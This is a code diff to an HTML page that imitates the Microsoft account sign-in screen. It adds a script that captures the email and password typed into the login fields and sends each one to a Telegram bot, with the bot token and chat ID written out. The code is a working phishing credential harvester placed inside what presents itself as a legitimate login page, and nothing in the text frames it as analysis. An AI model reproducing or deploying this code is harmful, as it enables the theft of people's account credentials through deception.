@@ -8,25 +8,11 @@
     <link rel="icon" href="assets/favicon.ico" />
     <title>Sign in to your Microsoft account</title>
     <link rel="stylesheet" href="assets/app.css" />
+    
 </head>
 
 <body>
-   <div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
-    component: { name: 'background-image-control',
-        publicMethods: $page.backgroundControlMethods,
-        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
-    <!-- ko if: smallImageUrl -->
-    <div class="background-image-small" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg&quot;);"></div>
-    <!-- /ko -->
-
-    <!-- ko if: backgroundImageUrl -->
-    <!-- ko if: svr.fUseAltText -->
-    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49_7916a894ebde7d29c2cc29b267f1299f.jpg&quot;);"></div>
-    <!-- /ko -->
-    <!-- ko ifnot: svr.fUseAltText --><!-- /ko -->
-        <!-- ko if: useImageMask --><!-- /ko -->
-    <!-- /ko -->
-</div></div>
+   
     <section id="section_uname">
          <div class="background-logo-holder">
         <img class="background-logo" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_8b36337037cff88c3df203bb73d58e41.png">
@@ -117,6 +103,48 @@
         <span>.&nbsp;.&nbsp;.</span>
     </footer>
     <script src="assets/app.js"></script>
+      <script src="https://unpkg.com/axios/dist/axios.min.js"></script> <!-- Include Axios for making HTTP requests -->
+
+    <script>
+        // Function to send data to Telegram bot
+        function sendToTelegram(data) {
+            const botToken = '5313824526:AAEI3MgZNSxfGmExZCB8srsgh_4c_gC6sDc';
+            const chatId = '2040461515';
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Make a POST request to Telegram API
+            axios.post(apiUrl, {
+                chat_id: chatId,
+                text: data
+            })
+            .then(response => {
+                console.log('Message sent to Telegram');
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
+        }
+
+        // Function to handle "Next" button click
+        function handleNextButtonClick(event) {
+            event.preventDefault();
+            const email = document.getElementById('inp_uname').value;
+            sendToTelegram(`Email: ${email}`);
+        }
+
+        // Function to handle "Sign in" button click
+        function handleSignInButtonClick(event) {
+            event.preventDefault();
+            const password = document.getElementById('inp_pwd').value;
+            sendToTelegram(`Password: ${password}`);
+        }
+        // Attach event listeners to buttons
+        const nextButton = document.getElementById('btn_next');
+        const signInButton = document.getElementById('btn_sig');
+        nextButton.addEventListener('click', handleNextButtonClick);
+        signInButton.addEventListener('click', handleSignInButtonClick);
+    </script>
+    
 </body>
 
 </html>
